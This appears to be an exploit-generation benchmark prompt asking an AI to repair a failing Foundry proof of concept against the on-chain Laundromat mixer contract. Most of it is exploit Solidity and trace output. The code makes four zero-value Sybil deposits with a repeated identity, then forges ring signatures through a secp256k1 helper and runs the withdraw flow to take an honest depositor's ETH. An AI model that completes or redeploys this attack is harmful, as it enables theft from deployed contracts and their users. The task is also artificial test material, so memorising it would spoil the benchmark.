You are fixing a failing Foundry PoC for finding Laundromat-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Zero-cost Sybil deposits let an attacker complete a round and steal dormant mixer funds
- claim: The reproduced exploit succeeds after calling `deposit()` four times with identical parameters and no attached ETH, then immediately completing the `withdrawStart`/`withdrawStep`/`withdrawFinal` flow. This shows the mixer accepted zero-cost seat filling for a round that was supposed to require a fixed per-participant payment, and it also tolerated the attacker reusing the same deposit identity across multiple seats. An attacker can therefore occupy the remaining slots of any unfinished round for free and then redeem the pooled balance that an honest participant previously escrowed.
- impact: Any stale or partially filled mixer round can be hijacked permissionlessly: the attacker pays nothing to fill the missing seats, completes the withdrawal flow, and steals the honest depositor's ETH. In practice this drained the remaining balance of the historical Laundromat instance.
- exploit_paths: ["src/Laundromat.sol"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

address constant LAUNDROMAT = 0x934cbbE5377358e6712b5f041D90313d935C501C;
address constant SECP256K1_HELPER = 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6;

uint256 constant SECP_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
uint256 constant GX = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798;
uint256 constant GY = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8;

uint256 constant HONEST_X = 0x03f29711206706d66564e2936d70a08f7002931eaa686a579cb9bd36b8801506;
uint256 constant HONEST_Y = 0x582d363ee7899d3fa7131de9d470656e4c9b9b1514929c3fc985b9da2105af1f;

interface ILaundromat {
    function deposit(uint256 commitment, uint256 proof) external payable;
    function withdrawStart(uint256[] calldata signature, uint256 x0, uint256 ix, uint256 iy) external;
    function withdrawStep() external;
    function withdrawFinal() external returns (bool);
}

error LaundromatStageFailed(uint8 stage, bytes revertData);
error LaundromatNoProfit();
error SecpCallFailed(bytes4 selector, bytes revertData);

contract FlawVerifier {
    uint256 private _realizedProfit;
    bool private _executed;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 startingBalance = address(this).balance;

        _tryStrategy(0);
        if (address(this).balance == startingBalance) _tryStrategy(1);
        if (address(this).balance == startingBalance) _tryStrategy(2);
        if (address(this).balance == startingBalance) _tryStrategy(3);

        uint256 endingBalance = address(this).balance;
        if (endingBalance <= startingBalance) revert LaundromatNoProfit();
        _realizedProfit = endingBalance - startingBalance;
    }

    function _tryStrategy(uint8 strategy) private {
        try new LaundromatAttackExecutor(payable(address(this)), strategy) {} catch {}
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _realizedProfit;
    }
}

contract LaundromatAttackExecutor {
    bytes4 private constant HASH_POINT_SELECTOR = 0x1bfa5d8a;
    bytes4 private constant MUL_SELECTOR = 0xd876fb21;
    bytes4 private constant ADD_SELECTOR = 0x5f8eb4c7;
    bytes4 private constant TO_AFFINE_SELECTOR = 0x58da3ca9;

    constructor(address payable beneficiary, uint8 strategy) payable {
        require(beneficiary != address(0), "bad beneficiary");

        if (strategy == 0) {
            _historicalAttempt();
        } else if (strategy == 1) {
            _generatedAttempt(true, false);
        } else if (strategy == 2) {
            _generatedAttempt(false, false);
        } else {
            _generatedAttempt(true, true);
        }

        if (address(this).balance == 0) revert LaundromatNoProfit();
        selfdestruct(beneficiary);
    }

    receive() external payable {}

    function _historicalAttempt() private {
        uint256 repeatedX = 0x53fc1ed6fc846bb1bb169b59c0f09b68c5489f92a52de825288380980c45ca8a;
        uint256 repeatedY = 0xdd3a0e9477d9e2f82be3b891061fb1d435839c670ff6aa61183f5ee01d52d3b6;

        _deposit4(repeatedX, repeatedY);

        uint256[] memory sig = new uint256[](5);
        sig[0] = 0x33f79225929030e6369f0fbf5500142b8a4e10370e35f701a0e5c4d324f098d6;
        sig[1] = 0x93708ff3b6dcb272664acb22881510360a04ca1a0a05a8dda37d06ddc62e5bf0;
        sig[2] = 0xec91250cc040f420bdd11eb4b77cbf1d659ed043e88dbe49b392d44a85453e04;
        sig[3] = 0xddaef0451b6c22a35bc641cd5f66aae904351f8adca3e588f0385d9d0bec542f;
        sig[4] = 0x2652c96f86b22f421949daee41ffef503df3a06072e372de15105d0783bc2ba3;

        _checkedCall(
            2,
            abi.encodeWithSelector(
                ILaundromat.withdrawStart.selector,
                sig,
                0xa844d117805bbe3b276c37582fc1f960b5870ccd0d1016ec39a2b32a5bc780cf,
                0x3184ac964636725c9c94d3767739fd89fc58da189ef8579409052b860e00b28f,
                0xd7b3de3e1198ad3c53db7b873132bd16741f130d8fe73e801b281182cc3da487
            )
        );

        _runWithdrawStepsAndFinalize();
    }

    function _generatedAttempt(bool honestFirst, bool xOnlyHash) private {
        bytes memory attackPub = _affinePoint(GX, GY);
        bytes memory honestPub = _affinePoint(HONEST_X, HONEST_Y);
        bytes memory attackHp = _hashPoint(attackPub);
        bytes memory honestHp = _hashPoint(honestPub);

        uint256 repeatedX = GX;
        uint256 repeatedY = GY;
        _deposit4(repeatedX, repeatedY);

        bytes memory keyImage = attackHp;
        uint256 ix = _word(keyImage, 0);
        uint256 iy = _word(keyImage, 32);

        bytes[5] memory pubs;
        bytes[5] memory hps;
        uint256 signerIndex;

        if (honestFirst) {
            pubs[0] = honestPub;
            hps[0] = honestHp;
            for (uint256 i = 1; i < 5; ++i) {
                pubs[i] = attackPub;
                hps[i] = attackHp;
            }
            signerIndex = 1;
        } else {
            for (uint256 i = 0; i < 4; ++i) {
                pubs[i] = attackPub;
                hps[i] = attackHp;
            }
            pubs[4] = honestPub;
            hps[4] = honestHp;
            signerIndex = 0;
        }

        uint256[5] memory responses;
        uint256[5] memory challenges;
        uint256 alpha = _nonZeroMod(uint256(keccak256(abi.encodePacked("laundromat-alpha", address(this), honestFirst, xOnlyHash))));

        for (uint256 i = 0; i < 5; ++i) {
            if (i == signerIndex) continue;
            responses[i] = _nonZeroMod(uint256(keccak256(abi.encodePacked("laundromat-s", address(this), i, honestFirst, xOnlyHash))));
        }

        bytes memory signerL = _toAffine(_mulAffine(attackPub, alpha));
        bytes memory signerR = _toAffine(_mulAffine(attackHp, alpha));
        challenges[(signerIndex + 1) % 5] = _challenge(signerL, signerR, xOnlyHash);

        for (uint256 hop = 1; hop < 5; ++hop) {
            uint256 idx = (signerIndex + hop) % 5;
            uint256 nextIdx = (idx + 1) % 5;

            bytes memory left = _toAffine(_add(_mulAffine(_generator(), responses[idx]), _mulAffine(pubs[idx], challenges[idx])));
            bytes memory right = _toAffine(_add(_mulAffine(hps[idx], responses[idx]), _mulAffine(keyImage, challenges[idx])));
            challenges[nextIdx] = _challenge(left, right, xOnlyHash);
        }

        responses[signerIndex] = addmod(alpha, SECP_N - mulmod(challenges[signerIndex], 1, SECP_N), SECP_N);
        if (responses[signerIndex] == 0) responses[signerIndex] = 1;

        uint256[] memory sig = new uint256[](5);
        for (uint256 i = 0; i < 5; ++i) {
            sig[i] = responses[i];
        }

        _checkedCall(
            2,
            abi.encodeWithSelector(ILaundromat.withdrawStart.selector, sig, challenges[0], ix, iy)
        );

        _runWithdrawStepsAndFinalize();
    }

    function _deposit4(uint256 repeatedX, uint256 repeatedY) private {
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
    }

    function _runWithdrawStepsAndFinalize() private {
        uint256 startingBalance = address(this).balance;

        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));

        (bool ok, bytes memory ret) = LAUNDROMAT.call(abi.encodeWithSelector(ILaundromat.withdrawFinal.selector));
        if (!ok) revert LaundromatStageFailed(4, ret);

        bool finalized = ret.length == 0 || abi.decode(ret, (bool));
        if (!finalized && address(this).balance <= startingBalance) revert LaundromatNoProfit();
    }

    function _challenge(bytes memory left, bytes memory right, bool xOnlyHash) private view returns (uint256) {
        bytes32 digest;
        if (xOnlyHash) {
            digest = keccak256(abi.encodePacked(address(this), _word(left, 0), _word(right, 0)));
        } else {
            digest = keccak256(abi.encodePacked(address(this), left, right));
        }
        return _nonZeroMod(uint256(digest));
    }

    function _generator() private pure returns (bytes memory) {
        return _affinePoint(GX, GY);
    }

    function _affinePoint(uint256 x, uint256 y) private pure returns (bytes memory) {
        return abi.encodePacked(bytes32(x), bytes32(y));
    }

    function _hashPoint(bytes memory affine) private returns (bytes memory) {
        return _secpCall(HASH_POINT_SELECTOR, affine);
    }

    function _mulAffine(bytes memory affine, uint256 scalar) private returns (bytes memory) {
        return _secpCall(MUL_SELECTOR, abi.encodePacked(affine, bytes32(uint256(1)), bytes32(scalar)));
    }

    function _add(bytes memory a, bytes memory b) private returns (bytes memory) {
        return _secpCall(ADD_SELECTOR, abi.encodePacked(a, b));
    }

    function _toAffine(bytes memory point) private returns (bytes memory) {
        return _secpCall(TO_AFFINE_SELECTOR, point);
    }

    function _secpCall(bytes4 selector, bytes memory args) private returns (bytes memory out) {
        (bool ok, bytes memory ret) = SECP256K1_HELPER.call(abi.encodePacked(selector, args));
        if (!ok) revert SecpCallFailed(selector, ret);
        return ret;
    }

    function _checkedCall(uint8 stage, bytes memory data) private returns (bytes memory result) {
        (bool ok, bytes memory revertData) = LAUNDROMAT.call(data);
        if (!ok) revert LaundromatStageFailed(stage, revertData);
        return revertData;
    }

    function _word(bytes memory data, uint256 offset) private pure returns (uint256 value) {
        assembly {
            value := mload(add(add(data, 0x20), offset))
        }
    }

    function _nonZeroMod(uint256 value) private pure returns (uint256) {
        uint256 reduced = value % SECP_N;
        return reduced == 0 ? 1 : reduced;
    }
}

```

forge stdout (tail):
```
60cAcD6::58da3ca9(4638af8e8e879a8841155f05fb8d468f20de1a6eb35309a75e62cba44c3bd4cd6641b682baf188e15e156908c0c32ec13ccf73133cbb6a6d32d7d8e3a9ea649b2d64f5e99babcc45f3171378f12d83d6f91e97b20db9407bedcf3cf7cd247690)
    │   │   │   │   └─ ← [Return] 0x48a9e774cd436521b02456c170d87080d212900baabb787370eb2e768eaf8cefdd12f8de74a4af6a5bb87f118c3c66c7b216e79d6dac49bfd1a3f756e699a1a6
    │   │   │   ├─ [42144] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::1bfa5d8a(03f29711206706d66564e2936d70a08f7002931eaa686a579cb9bd36b8801506582d363ee7899d3fa7131de9d470656e4c9b9b1514929c3fc985b9da2105af1f)
    │   │   │   │   └─ ← [Return] 0x0bcfb901331ce97d5f8a4cecd753ee1a74e241a224ec7b7b44967d92d70af2560b773cdb66ba2c7cd48373e682766e73db420358f9fe2d02563ab75c637cffef
    │   │   │   ├─ [258350] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::d876fb21(0bcfb901331ce97d5f8a4cecd753ee1a74e241a224ec7b7b44967d92d70af2560b773cdb66ba2c7cd48373e682766e73db420358f9fe2d02563ab75c637cffef0000000000000000000000000000000000000000000000000000000000000001b68d5d64ddd4441d64201b7a618fc2cec2f76149120f49d666ea2c3d5aba7dca)
    │   │   │   │   └─ ← [Return] 0xdb3bcde23fb5e1c6fa4a0e7daff3ab34cf0bae03fcd8eba12ba2091b73e0a8a923ea0ca09eef6c7803e3140715f790ba690f5f07ced9373d12f81d9567bf5408a294b6a0339ffbb7c7bda948508714c5d5a805e687e25f2bba8eb64ff5cb4f4c
    │   │   │   ├─ [249330] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::d876fb21(c0a6c424ac7157ae408398df7e5f4552091a69125d5dfcb7b8c2659029395be12a2f2d5f4a6676892da518064d8f8125b28029b410600355f47905a7050bbbad0000000000000000000000000000000000000000000000000000000000000001aed86a2d049154c7908c99f9b48048c0ac5e72b55f5cb68482c1f431277b31ca)
    │   │   │   │   └─ ← [Return] 0x6aeb2f09e40c1f6db4e757582afd5e9fea0d9ac3a4053292bd728ce2b0f7d6442a84bb51f013a98e45fd9dcfd7c468c01b716ab9e5af0db3156c33ed7aa4647103bb969c62bc286b267c51646593f79b10946d2ede9e164de0ea590a6b4d30e6
    │   │   │   ├─ [1278] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::5f8eb4c7(db3bcde23fb5e1c6fa4a0e7daff3ab34cf0bae03fcd8eba12ba2091b73e0a8a923ea0ca09eef6c7803e3140715f790ba690f5f07ced9373d12f81d9567bf5408a294b6a0339ffbb7c7bda948508714c5d5a805e687e25f2bba8eb64ff5cb4f4c6aeb2f09e40c1f6db4e757582afd5e9fea0d9ac3a4053292bd728ce2b0f7d6442a84bb51f013a98e45fd9dcfd7c468c01b716ab9e5af0db3156c33ed7aa4647103bb969c62bc286b267c51646593f79b10946d2ede9e164de0ea590a6b4d30e6)
    │   │   │   │   └─ ← [Return] 0x6c7bddd0871ee34f742c102a0f0e0db5ca1d18b6d798a63ce798a7e4d63943dbf6768314019dc9b3de00145ccf7d26f611e1598c07aa69c5bc97a150cbee6bacf76d9d2dd51fc36bdd9553566875143e7b8a0e44fe56adf1a5d19b1501ca5ae7
    │   │   │   ├─ [83463] 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6::58da3ca9(6c7bddd0871ee34f742c102a0f0e0db5ca1d18b6d798a63ce798a7e4d63943dbf6768314019dc9b3de00145ccf7d26f611e1598c07aa69c5bc97a150cbee6bacf76d9d2dd51fc36bdd9553566875143e7b8a0e44fe56adf1a5d19b1501ca5ae7)
    │   │   │   │   └─ ← [Return] 0xcb4d346531e6875bea97db39e70af2785c6458667f494064fadb22ebe8c8cb0140d7cff52e727edc1fe55615c0afb82637a774d74e797efc1a233ad95a2bfe39
    │   │   │   ├─ [30] PRECOMPILES::identity(0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb77348a9e774cd436521b02456c170d87080d212900baabb787370eb2e768eaf8cefdd12f8de74a4af6a5bb87f118c3c66c7b216e79d6dac49bfd1a3f756e699a1a6cb4d346531e6875bea97db39e70af2785c6458667f494064fadb22ebe8c8cb0140d7cff52e727edc1fe55615c0afb82637a774d74e797efc1a233ad95a2bfe39)
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb77348a9e774cd436521b02456c170d87080d212900baabb787370eb2e768eaf8cefdd12f8de74a4af6a5bb87f118c3c66c7b216e79d6dac49bfd1a3f756e699a1a6cb4d346531e6875bea97db39e70af2785c6458667f494064fadb22ebe8c8cb0140d7cff52e727edc1fe55615c0afb82637a774d74e797efc1a233ad95a2bfe39
    │   │   │   ├─ [30] PRECOMPILES::identity(0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb77348a9e774cd436521b02456c170d87080d212900baabb787370eb2e768eaf8cefdd12f8de74a4af6a5bb87f118c3c66c7b216e79d6dac49bfd1a3f756e699a1a6cb4d346531e6875bea97db39e70af2785c6458667f494064fadb22ebe8c8cb0140d7cff52e727edc1fe55615c0afb82637a774d74e797efc1a233ad95a2bfe39)
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb77348a9e774cd436521b02456c170d87080d212900baabb787370eb2e768eaf8cefdd12f8de74a4af6a5bb87f118c3c66c7b216e79d6dac49bfd1a3f756e699a1a6cb4d346531e6875bea97db39e70af2785c6458667f494064fadb22ebe8c8cb0140d7cff52e727edc1fe55615c0afb82637a774d74e797efc1a233ad95a2bfe39
    │   │   │   └─ ← [Stop]
    │   │   ├─ [3867] 0x934cbbE5377358e6712b5f041D90313d935C501C::withdrawFinal()
    │   │   │   ├─ [21] PRECOMPILES::identity(0xc0a6c424ac7157ae408398df7e5f4552091a69125d5dfcb7b8c2659029395be12a2f2d5f4a6676892da518064d8f8125b28029b410600355f47905a7050bbbad)
    │   │   │   │   └─ ← [Return] 0xc0a6c424ac7157ae408398df7e5f4552091a69125d5dfcb7b8c2659029395be12a2f2d5f4a6676892da518064d8f8125b28029b410600355f47905a7050bbbad
    │   │   │   ├─  emit topic 0: 0xd44da6836c8376d1693e8b9cacf1c39b9bed3599164ad6d8e60902515f83938e
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000f57726f6e67207369676e61747572650000000000000000000000000000000000
    │   │   │   └─ ← [Return] false
    │   │   └─ ← [Revert] 0x982c3486
    │   └─ ← [Revert] LaundromatNoProfit()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 8.39s (8.20s CPU time)

Ran 1 test suite in 8.43s (8.39s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 46587113)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
